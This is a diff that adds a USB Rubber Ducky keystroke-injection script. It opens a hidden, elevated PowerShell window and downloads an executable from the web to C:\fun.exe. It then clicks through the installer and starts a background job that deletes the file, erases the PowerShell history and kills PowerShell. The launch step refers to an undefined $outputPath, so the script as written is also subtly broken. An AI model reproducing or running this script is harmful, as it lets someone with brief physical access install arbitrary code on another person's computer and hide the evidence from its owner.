@@ -1,0 +1,69 @@
+DUCKY_LANG US
+
+REM # Allow extra time for connection
+DELAY 2000
+
+REM # Open powershell, hidden with elevated priviledges
+GUI r
+DELAY 250
+STRING powershell.exe -WindowStyle Hidden
+CTRL+SHIFT+ENTER
+DELAY 1000
+LEFT
+ENTER
+DELAY 500
+
+
+
+
+
+REM ##### Payload Here
+
+STRING $url = "https://www.donationcoder.com/Software/Mouser/DrWindows/downloads/DrWindowsSetup.exe"
+ENTER
+STRING Invoke-WebRequest -Uri $url -OutFile C:\fun.exe
+ENTER
+
+
+
+REM ##### Scheduled cleanup job for after the payload's setup completes
+
+STRING Start-Job -ScriptBlock { Start-Sleep -Seconds 10; Remove-Item -Path C:\fun.exe -Force; Start-Sleep -Seconds 3; Remove-Item (Get-PSReadlineOption).HistorySavePath; taskkill /F /IM powershell.exe }
+ENTER
+
+
+
+REM # Setup program through GUI
+STRING Start-Process -FilePath $outputPath
+ENTER
+DELAY 3000
+
+REM # Customized to specific program being installed
+ENTER
+DELAY 100
+ENTER
+DELAY 100
+ENTER
+DELAY 100
+ENTER
+DELAY 100
+ENTER
+DELAY 3000
+ENTER
+DELAY 100
+ENTER
+DELAY 3000
+
+
+
+
+
+REM ##### Normal cleanup
+
+REM STRING Remove-Item -Path $outputPath -Force
+REM ENTER
+REM DELAY 250
+
+REM # Close powershell
+REM STRING taskkill /F /IM powershell.exe
+REM ENTER
